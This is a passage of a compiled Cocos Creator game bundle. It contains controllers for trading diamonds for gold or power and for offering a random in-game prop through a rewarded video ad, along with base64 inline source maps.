9yID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGRldGFpbE5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkxhYmVsKVxyXG4gICAgZGV0YWlsTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIHN0YXJ0KCl7XHJcbiAgICAgICAgdGhpcy5kZXRhaWxOb2RlLm9uKGNjLk5vZGUuRXZlbnRUeXBlLlRPVUNIX1NUQVJULCAoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLmRldGFpbE5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgdGhpcy50YWJsZVZpZXdNZWRpYXRvci5kYXRhcyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLlByb3ApLmZpbHRlcih2YWx1ZSA9PiB2YWx1ZVsnaWQnXSAhPSA3ICYmIHZhbHVlWydpZCddICE9IDggJiYgdmFsdWVbJ2lkJ10gIT0gMTApLnNvcnQoKGEsIGIpID0+IGFbJ29yZGVyJ10tYlsnb3JkZXInXSk7XHJcbiAgICB9XHJcblxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/ExchangeController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '095cbB1T3BGjYPbnwd2ta5g', 'ExchangeController');
// script/app/home/ExchangeController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("../info/World");
var Extend_1 = require("../../../framework/extend/Extend");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ExchangeController = /** @class */ (function (_super) {
    __extends(ExchangeController, _super);
    function ExchangeController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.exchangeButton = null;
        _this.diamondLabel = null;
        _this.exchangeLabel = null;
        _this.exchangeSprite = null;
        _this.exchangeSpriteFrames = [];
        _this._diamondCount = 0;
        _this._type = 1;
        return _this;
    }
    Object.defineProperty(ExchangeController.prototype, "diamondCount", {
        get: function () {
            return this._diamondCount;
        },
        set: function (value) {
            this._diamondCount = value;
            if (this._type == 1) {
                this.exchangeLabel.string = Extend_1.ext.shortFormat(this.getGoldCount());
            }
            else {
                this.exchangeLabel.string = "" + this.getPowerCount();
            }
            this.updateView();
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(ExchangeController.prototype, "type", {
        set: function (value) {
            this._type = value;
            this.exchangeSprite.spriteFrame = this.exchangeSpriteFrames[this._type - 1];
            this.diamondCount = World_1.World.Storage.diamondCount;
        },
        enumerable: false,
        configurable: true
    });
    ExchangeController.prototype.getGoldCount = function () {
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.GoldUp);
        return cfg[World_1.World.Storage.goldLv - 1]['diamond_ex'] * this._diamondCount;
    };
    ExchangeController.prototype.getPowerCount = function () {
        return 5 * this._diamondCount;
    };
    ExchangeController.prototype.updateView = function () {
        this.exchangeButton.interactable = this._diamondCount > 0;
        this.diamondLabel.string = "" + this._diamondCount;
    };
    ExchangeController.prototype.onDiamondPlus = function () {
        if (this._diamondCount < World_1.World.Storage.diamondCount) {
            this.diamondCount++;
        }
    };
    ExchangeController.prototype.onDiamondMinus = function () {
        if (this._diamondCount > 0) {
            this.diamondCount--;
        }
    };
    ExchangeController.prototype.onExchange = function () {
        if (this._type == 1) {
            World_1.World.Storage.goldCount += this.getGoldCount();
        }
        else {
            World_1.World.Storage.power += this.getPowerCount();
        }
        this.node.destroy();
    };
    __decorate([
        property(cc.Button)
    ], ExchangeController.prototype, "exchangeButton", void 0);
    __decorate([
        property(cc.Label)
    ], ExchangeController.prototype, "diamondLabel", void 0);
    __decorate([
        property(cc.Label)
    ], ExchangeController.prototype, "exchangeLabel", void 0);
    __decorate([
        property(cc.Sprite)
    ], ExchangeController.prototype, "exchangeSprite", void 0);
    __decorate([
        property(cc.SpriteFrame)
    ], ExchangeController.prototype, "exchangeSpriteFrames", void 0);
    ExchangeController = __decorate([
        ccclass
    ], ExchangeController);
    return ExchangeController;
}(cc.Component));
exports.default = ExchangeController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvRXhjaGFuZ2VDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSx1Q0FBb0M7QUFDcEMsMkRBQXFEO0FBQ3JELHFFQUFrRTtBQUNsRSw2REFBMEQ7QUFFcEQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBZ0Qsc0NBQVk7SUFBNUQ7UUFBQSxxRUE2RUM7UUExRUcsb0JBQWMsR0FBYSxJQUFJLENBQUM7UUFHaEMsa0JBQVksR0FBYSxJQUFJLENBQUM7UUFHOUIsbUJBQWEsR0FBYSxJQUFJLENBQUM7UUFHL0Isb0JBQWMsR0FBYSxJQUFJLENBQUM7UUFHaEMsMEJBQW9CLEdBQW9CLEVBQUUsQ0FBQztRQUVuQyxtQkFBYSxHQUFHLENBQUMsQ0FBQztRQWlCbEIsV0FBSyxHQUFHLENBQUMsQ0FBQzs7SUEyQ3RCLENBQUM7SUF6REcsc0JBQUksNENBQVk7YUFBaEI7WUFDSSxPQUFPLElBQUksQ0FBQyxhQUFhLENBQUM7UUFDOUIsQ0FBQzthQUVELFVBQWlCLEtBQWE7WUFDMUIsSUFBSSxDQUFDLGFBQWEsR0FBRyxLQUFLLENBQUM7WUFDM0IsSUFBSSxJQUFJLENBQUMsS0FBSyxJQUFJLENBQUMsRUFBQztnQkFDaEIsSUFBSSxDQUFDLGFBQWEsQ0FBQyxNQUFNLEdBQUcsWUFBRyxDQUFDLFdBQVcsQ0FBQyxJQUFJLENBQUMsWUFBWSxFQUFFLENBQUMsQ0FBQzthQUNwRTtpQkFBSztnQkFDRixJQUFJLENBQUMsYUFBYSxDQUFDLE1BQU0sR0FBRyxLQUFHLElBQUksQ0FBQyxhQUFhLEVBQUksQ0FBQzthQUN6RDtZQUNELElBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztRQUN0QixDQUFDOzs7T0FWQTtJQWVELHNCQUFJLG9DQUFJO2FBQVIsVUFBUyxLQUFhO1lBQ2xCLElBQUksQ0FBQyxLQUFLLEdBQUcsS0FBSyxDQUFDO1lBQ25CLElBQUksQ0FBQyxjQUFjLENBQUMsV0FBVyxHQUFHLElBQUksQ0FBQyxvQkFBb0IsQ0FBQyxJQUFJLENBQUMsS0FBSyxHQUFDLENBQUMsQ0FBQyxDQUFDO1lBQzFFLElBQUksQ0FBQyxZQUFZLEdBQUcsYUFBSyxDQUFDLE9BQU8sQ0FBQyxZQUFZLENBQUM7UUFDbkQsQ0FBQzs7O09BQUE7SUFFRCx5Q0FBWSxHQUFaO1FBQ0ksSUFBSSxHQUFHLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxNQUFNLENBQUMsQ0FBQztRQUM1RCxPQUFPLEdBQUcsQ0FBQyxhQUFLLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBQyxDQUFDLENBQUMsQ0FBQyxZQUFZLENBQUMsR0FBQyxJQUFJLENBQUMsYUFBYSxDQUFDO0lBQ3hFLENBQUM7SUFFRCwwQ0FBYSxHQUFiO1FBQ0ksT0FBTyxDQUFDLEdBQUcsSUFBSSxDQUFDLGFBQWEsQ0FBQztJQUNsQyxDQUFDO0lBRUQsdUNBQVUsR0FBVjtRQUNJLElBQUksQ0FBQyxjQUFjLENBQUMsWUFBWSxHQUFHLElBQUksQ0FBQyxhQUFhLEdBQUcsQ0FBQyxDQUFDO1FBQzFELElBQUksQ0FBQyxZQUFZLENBQUMsTUFBTSxHQUFHLEtBQUcsSUFBSSxDQUFDLGFBQWUsQ0FBQztJQUN2RCxDQUFDO0lBRUQsMENBQWEsR0FBYjtRQUNJLElBQUksSUFBSSxDQUFDLGFBQWEsR0FBRyxhQUFLLENBQUMsT0FBTyxDQUFDLFlBQVksRUFBQztZQUNoRCxJQUFJLENBQUMsWUFBWSxFQUFFLENBQUM7U0FDdkI7SUFDTCxDQUFDO0lBRUQsMkNBQWMsR0FBZDtRQUNJLElBQUksSUFBSSxDQUFDLGFBQWEsR0FBRyxDQUFDLEVBQUM7WUFDdkIsSUFBSSxDQUFDLFlBQVksRUFBRSxDQUFDO1NBQ3ZCO0lBQ0wsQ0FBQztJQUVELHVDQUFVLEdBQVY7UUFDSSxJQUFJLElBQUksQ0FBQyxLQUFLLElBQUksQ0FBQyxFQUFDO1lBQ2hCLGFBQUssQ0FBQyxPQUFPLENBQUMsU0FBUyxJQUFJLElBQUksQ0FBQyxZQUFZLEVBQUUsQ0FBQztTQUNsRDthQUFLO1lBQ0YsYUFBSyxDQUFDLE9BQU8sQ0FBQyxLQUFLLElBQUksSUFBSSxDQUFDLGFBQWEsRUFBRSxDQUFDO1NBQy9DO1FBQ0QsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLEVBQUUsQ0FBQztJQUN4QixDQUFDO0lBekVEO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7OERBQ1k7SUFHaEM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQzs0REFDVztJQUc5QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDOzZEQUNZO0lBRy9CO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7OERBQ1k7SUFHaEM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFdBQVcsQ0FBQztvRUFDa0I7SUFmMUIsa0JBQWtCO1FBRHRDLE9BQU87T0FDYSxrQkFBa0IsQ0E2RXRDO0lBQUQseUJBQUM7Q0E3RUQsQUE2RUMsQ0E3RStDLEVBQUUsQ0FBQyxTQUFTLEdBNkUzRDtrQkE3RW9CLGtCQUFrQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9leHRlbmQvRXh0ZW5kXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBFeGNoYW5nZUNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5CdXR0b24pXHJcbiAgICBleGNoYW5nZUJ1dHRvbjpjYy5CdXR0b24gPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIGRpYW1vbmRMYWJlbDogY2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIGV4Y2hhbmdlTGFiZWw6IGNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgZXhjaGFuZ2VTcHJpdGU6Y2MuU3ByaXRlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlRnJhbWUpXHJcbiAgICBleGNoYW5nZVNwcml0ZUZyYW1lczpbY2MuU3ByaXRlRnJhbWVdID0gW107XHJcblxyXG4gICAgcHJpdmF0ZSBfZGlhbW9uZENvdW50ID0gMDtcclxuXHJcblxyXG4gICAgZ2V0IGRpYW1vbmRDb3VudCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9kaWFtb25kQ291bnQ7XHJcbiAgICB9XHJcblxyXG4gICAgc2V0IGRpYW1vbmRDb3VudCh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgdGhpcy5fZGlhbW9uZENvdW50ID0gdmFsdWU7XHJcbiAgICAgICAgaWYgKHRoaXMuX3R5cGUgPT0gMSl7XHJcbiAgICAgICAgICAgIHRoaXMuZXhjaGFuZ2VMYWJlbC5zdHJpbmcgPSBleHQuc2hvcnRGb3JtYXQodGhpcy5nZXRHb2xkQ291bnQoKSk7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICB0aGlzLmV4Y2hhbmdlTGFiZWwuc3RyaW5nID0gYCR7dGhpcy5nZXRQb3dlckNvdW50KCl9YDtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy51cGRhdGVWaWV3KCk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfdHlwZSA9IDE7XHJcblxyXG5cclxuICAgIHNldCB0eXBlKHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICB0aGlzLl90eXBlID0gdmFsdWU7XHJcbiAgICAgICAgdGhpcy5leGNoYW5nZVNwcml0ZS5zcHJpdGVGcmFtZSA9IHRoaXMuZXhjaGFuZ2VTcHJpdGVGcmFtZXNbdGhpcy5fdHlwZS0xXTtcclxuICAgICAgICB0aGlzLmRpYW1vbmRDb3VudCA9IFdvcmxkLlN0b3JhZ2UuZGlhbW9uZENvdW50O1xyXG4gICAgfVxyXG5cclxuICAgIGdldEdvbGRDb3VudCgpe1xyXG4gICAgICAgIGxldCBjZmcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5Hb2xkVXApO1xyXG4gICAgICAgIHJldHVybiBjZmdbV29ybGQuU3RvcmFnZS5nb2xkTHYtMV1bJ2RpYW1vbmRfZXgnXSp0aGlzLl9kaWFtb25kQ291bnQ7XHJcbiAgICB9XHJcblxyXG4gICAgZ2V0UG93ZXJDb3VudCgpe1xyXG4gICAgICAgIHJldHVybiA1ICogdGhpcy5fZGlhbW9uZENvdW50O1xyXG4gICAgfVxyXG5cclxuICAgIHVwZGF0ZVZpZXcoKXtcclxuICAgICAgICB0aGlzLmV4Y2hhbmdlQnV0dG9uLmludGVyYWN0YWJsZSA9IHRoaXMuX2RpYW1vbmRDb3VudCA+IDA7XHJcbiAgICAgICAgdGhpcy5kaWFtb25kTGFiZWwuc3RyaW5nID0gYCR7dGhpcy5fZGlhbW9uZENvdW50fWA7XHJcbiAgICB9XHJcblxyXG4gICAgb25EaWFtb25kUGx1cygpe1xyXG4gICAgICAgIGlmICh0aGlzLl9kaWFtb25kQ291bnQgPCBXb3JsZC5TdG9yYWdlLmRpYW1vbmRDb3VudCl7XHJcbiAgICAgICAgICAgIHRoaXMuZGlhbW9uZENvdW50Kys7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uRGlhbW9uZE1pbnVzKCl7XHJcbiAgICAgICAgaWYgKHRoaXMuX2RpYW1vbmRDb3VudCA+IDApe1xyXG4gICAgICAgICAgICB0aGlzLmRpYW1vbmRDb3VudC0tO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBvbkV4Y2hhbmdlKCl7XHJcbiAgICAgICAgaWYgKHRoaXMuX3R5cGUgPT0gMSl7XHJcbiAgICAgICAgICAgIFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ICs9IHRoaXMuZ2V0R29sZENvdW50KCk7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICBXb3JsZC5TdG9yYWdlLnBvd2VyICs9IHRoaXMuZ2V0UG93ZXJDb3VudCgpO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLm5vZGUuZGVzdHJveSgpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/RecommendPropsController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'bb6edVloYVAk6hnOKWOg07b', 'RecommendPropsController');
// script/app/home/RecommendPropsController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Role_1 = require("../entities/role/Role");
var World_1 = require("../info/World");
var Extend_1 = require("../../../framework/extend/Extend");
var BulletOfJianGuangSi_1 = require("../entities/bullet/BulletOfJianGuangSi");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
/** 侯选列表 */
var candidateList = [3, 4, 5];
var RecommendPropsController = /** @class */ (function (_super) {
    __extends(RecommendPropsController, _super);
    function RecommendPropsController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.role = null;
        _this.fangHuDunSke = null;
        _this.useNode = null;
        _this.noUseNode = null;
        /**
         * 道具id
         * */
        _this._propId = 0;
        return _this;
    }
    RecommendPropsController.prototype.onLoad = function () {
        var _this = this;
        this.fangHuDunSke.node.active = false;
        this.noUseNode.on(cc.Node.EventType.POSITION_CHANGED, function () {
            _this.useNode.position = _this.noUseNode.position.add(cc.v2(0, 87));
        });
        var gameBulletsController = window['GameBulletsController'];
        gameBulletsController.bulletLayer.on(cc.Node.EventType.CHILD_ADDED, function (bulletNode) {
            bulletNode.group = "ui";
        });
        var list = candidateList.filter(function (value) { return !World_1.World.My.propInfo.beUsing(value); });
        if (list.length == 0) {
            list = candidateList;
        }
        this._propId = Extend_1.ext.randomElement(list);
        var prefabPath = 'prefab/entities/bullet/propBullet' + this._propId;
        cc.loader.loadRes(prefabPath, cc.Prefab, function (error, resource) {
            if (error == null) {
                _this.updateShown();
            }
        });
        cc.game.on("video_1", function () {
            _this.onClickUseDo();
        }, this);
    };
    RecommendPropsController.prototype.updateShown = function () {
        var _this = this;
        console.log("updateShown===>", this._propId);
        switch (this._propId) {
            case 3:
                {
                    /** 发出12个地雷 怪物踩到就会爆炸 地雷持续20S */
                    var num = 6;
                    var onceDegree_1 = 360 / 6;
                    var onceTime = 0.05;
                    var moveLen_1 = 80;
                    var moveSpeed = 1000;
                    var moveDuration_1 = moveLen_1 / moveSpeed;
                    var time_1 = 20;
                    var startPos_1 = cc.v2(this.role.node.x, this.role.node.y);
                    var _loop_1 = function (i) {
                        this_1.node.runAction(cc.sequence(cc.delayTime(i * onceTime), cc.callFunc(function () {
                            var bullet = window['GameBulletsController'].getInactivePropBullet(3);
                            bullet.node.active = true;
                            var degree = 30 + i * onceDegree_1;
                            bullet.node.rotation = degree - 90;
                            var dir = cc.v2(0, 1).rotateSelf(cc.misc.degreesToRadians(-degree)).normalizeSelf();
                            bullet.node.position = startPos_1;
                            bullet.node.scale = 0;
                            bullet.node.runAction(cc.scaleTo(moveDuration_1, 1));
                            bullet.collider.enabled = false;
                            bullet.node.runAction(cc.sequence(cc.moveBy(moveDuration_1, dir.mul(moveLen_1)), cc.callFunc(function () {
                                bullet.collider.enabled = true;
                                bullet.node.runAction(cc.sequence(cc.delayTime(time_1), cc.callFunc(function () {
                                    bullet.node.active = false;
                                })));
                            })));
                        })));
                    };
                    var this_1 = this;
                    for (var i = 0; i < num; i++) {
                        _loop_1(i);
                    }
                    var _loop_2 = function (i) {
                        this_2.node.runAction(cc.sequence(cc.delayTime((i + num) * onceTime), cc.callFunc(function () {
                            var bullet = window['GameBulletsController'].getInactivePropBullet(3);
                            bullet.node.active = true;
                            var degree = 60 + i * onceDegree_1;
                            bullet.node.rotation = degree - 90;
                            var dir = cc.v2(0, 1).rotateSelf(cc.misc.degreesToRadians(-degree)).normalizeSelf();
                            bullet.node.position = startPos_1;
                            bullet.node.scale = 0;
                            bullet.node.runAction(cc.scaleTo(moveDuration_1, 1));
                            bullet.collider.enabled = false;
                            bullet.node.runAction(cc.sequence(cc.moveBy(moveDuration_1, dir.mul(moveLen_1 + 60)), cc.callFunc(function () {
                                bullet.collider.enabled = true;
                                bullet.node.runAction(cc.sequence(cc.delayTime(time_1), cc.callFunc(function () {
                                    bullet.node.active = false;
                                })));
                            })));
                        })));
                    };
                    var this_2 = this;
                    for (var i = 0; i < num; i++) {
                        _loop_2(i);
                    }
                    this.node.runAction(cc.sequence(cc.delayTime(time_1 + 1), cc.callFunc(function () {
                        _this.updateShown();
                    })));
                }
                break;
            case 4:
                {
                    /** 播放见光死的动画 */
                    var bullet = window['GameBulletsController'].getInactivePropBullet(4);
                    bullet.node.position = this.role.node.position;
                    bullet.node.active = true;
                    bullet.getComponent(sp.Skeleton).setAnimation(0, "614", true);
                    bullet.getComponent(sp.Skeleton).setCompleteListener(function () { });
                    bullet.node.removeComponent(BulletOfJianGuangSi_1.default);
                }
                break;
            case 5:
                this.fangHuDunSke.node.active = true;
                this.fangHuDunSke.setAnimation(0, "start", false);
                this.fangHuDunSke.setCompleteListener(function (trackEntry, loopCount) {
                    var name = trackEntry.animation ? trackEntry.animation.name : '';
                    // console.log("=============>completeLis..", name);
                    if (name == "start" || name == "transition") {
                        _this.fangHuDunSke.setAnimation(0, "loops", false);
                        if (!_this.node.getActionByTag(114)) {
                            var speedAction = cc.speed(cc.repeatForever(cc.rotateBy(1.25, 720)), 0);
                            speedAction.setTag(114);
                            _this.fangHuDunSke.node.runAction(speedAction);
                            cc.tween(speedAction)
                                .to(1, { _speed: 1 }, { easing: 'sineIn' })
                                .start();
                        }
                    }
                });
                break;
        }
    };
    RecommendPropsController.prototype.onClickUse = function (event, data) {
        console.log("【video】1 道具推荐【click】RecommendPropsController Use");
        World_1.World.Storage._videoSign = 1;
        World_1.World.Storage.videoAd_show();
    };
    RecommendPropsController.prototype.onClickUseDo = function () {
        World_1.World.My.propInfo.use(this._propId);
        this.node.destroy();
    };
    RecommendPropsController.prototype.onClickNoUse = function (event, data) {
        console.log("【click】RecommendPropsController NoUse");
        this.node.destroy();
    };
    __decorate([
        property(Role_1.default)
    ], RecommendPropsController.prototype, "role", void 0);
    __decorate([
        property(sp.Skeleton)
    ], RecommendPropsController.prototype, "fangHuDunSke", void 0);
    __decorate([
        property(cc.Node)
    ], RecommendPropsController.prototype, "useNode", void 0);
    __decorate([
        property(cc.Node)
    ], RecommendPropsController.prototype, "noUseNode", void 0);
    RecommendPropsController = __decorate([
        ccclass
    ], RecommendPropsController);
    return RecommendPropsController;
}(cc.Component));
exports.default = RecommendPropsController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvUmVjb21tZW5kUHJvcHNDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSw4Q0FBeUM7QUFDekMsdUNBQW9DO0FBQ3BDLDJEQUFxRDtBQUNyRCw4RUFBeUU7QUFDbkUsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsV0FBVztBQUNYLElBQU0sYUFBYSxHQUFHLENBQUMsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQztBQUdoQztJQUFzRCw0Q0FBWTtJQUFsRTtRQUFBLHFFQTBKQztRQXZKRyxVQUFJLEdBQVEsSUFBSSxDQUFDO1FBR2pCLGtCQUFZLEdBQWUsSUFBSSxDQUFDO1FBR2hDLGFBQU8sR0FBVyxJQUFJLENBQUM7UUFHdkIsZUFBUyxHQUFXLElBQUksQ0FBQztRQUV6Qjs7YUFFSztRQUNHLGFBQU8sR0FBRyxDQUFDLENBQUM7O0lBeUl4QixDQUFDO0lBdklHLHlDQUFNLEdBQU47UUFBQSxpQkF5QkM7UUF4QkcsSUFBSSxDQUFDLFlBQVksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUN0QyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxnQkFBZ0IsRUFBRTtZQUNsRCxLQUFJLENBQUMsT0FBTyxDQUFDLFFBQVEsR0FBRyxLQUFJLENBQUMsU0FBUyxDQUFDLFFBQVEsQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLENBQUMsQ0FBQztRQUN0RSxDQUFDLENBQUMsQ0FBQztRQUNILElBQUkscUJBQXFCLEdBQUcsTUFBTSxDQUFDLHVCQUF1QixDQUFDLENBQUM7UUFDNUQscUJBQXFCLENBQUMsV0FBVyxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxXQUFXLEVBQUUsVUFBQyxVQUFrQjtZQUNuRixVQUFVLENBQUMsS0FBSyxHQUFHLElBQUksQ0FBQztRQUM1QixDQUFDLENBQUMsQ0FBQztRQUNILElBQUksSUFBSSxHQUFHLGFBQWEsQ0FBQyxNQUFNLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxDQUFDLGFBQUssQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLE9BQU8sQ0FBQyxLQUFLLENBQUMsRUFBakMsQ0FBaUMsQ0FBQyxDQUFDO1FBQzVFLElBQUksSUFBSSxDQUFDLE1BQU0sSUFBSSxDQUFDLEVBQUM7WUFDakIsSUFBSSxHQUFHLGFBQWEsQ0FBQztTQUN4QjtRQUNELElBQUksQ0FBQyxPQUFPLEdBQUcsWUFBRyxDQUFDLGFBQWEsQ0FBQyxJQUFJLENBQUMsQ0FBQztRQUN2QyxJQUFJLFVBQVUsR0FBRyxtQ0FBbUMsR0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDO1FBRWxFLEVBQUUsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLFVBQVUsRUFBRSxFQUFFLENBQUMsTUFBTSxFQUFFLFVBQUMsS0FBSyxFQUFFLFFBQVE7WUFDckQsSUFBSSxLQUFLLElBQUksSUFBSSxFQUFDO2dCQUNkLEtBQUksQ0FBQyxXQUFXLEVBQUUsQ0FBQzthQUN0QjtRQUNMLENBQUMsQ0FBQyxDQUFDO1FBRUgsRUFBRSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsU0FBUyxFQUFDO1lBQ2pCLEtBQUksQ0FBQyxZQUFZLEVBQUUsQ0FBQTtRQUN2QixDQUFDLEVBQUMsSUFBSSxDQUFDLENBQUM7SUFDWixDQUFDO0lBRUQsOENBQVcsR0FBWDtRQUFBLGlCQXlGQztRQXhGRyxPQUFPLENBQUMsR0FBRyxDQUFDLGlCQUFpQixFQUFFLElBQUksQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUM3QyxRQUFRLElBQUksQ0FBQyxPQUFPLEVBQUM7WUFDakIsS0FBSyxDQUFDO2dCQUNOO29CQUNJLCtCQUErQjtvQkFDL0IsSUFBSSxHQUFHLEdBQUcsQ0FBQyxDQUFDO29CQUNaLElBQUksWUFBVSxHQUFHLEdBQUcsR0FBQyxDQUFDLENBQUM7b0JBQ3ZCLElBQUksUUFBUSxHQUFHLElBQUksQ0FBQztvQkFDcEIsSUFBSSxTQUFPLEdBQUcsRUFBRSxDQUFDO29CQUNqQixJQUFJLFNBQVMsR0FBRyxJQUFJLENBQUM7b0JBQ3JCLElBQUksY0FBWSxHQUFHLFNBQU8sR0FBQyxTQUFTLENBQUM7b0JBQ3JDLElBQUksTUFBSSxHQUFHLEVBQUUsQ0FBQztvQkFDZCxJQUFJLFVBQVEsR0FBRyxFQUFFLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUMsRUFBRSxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQzs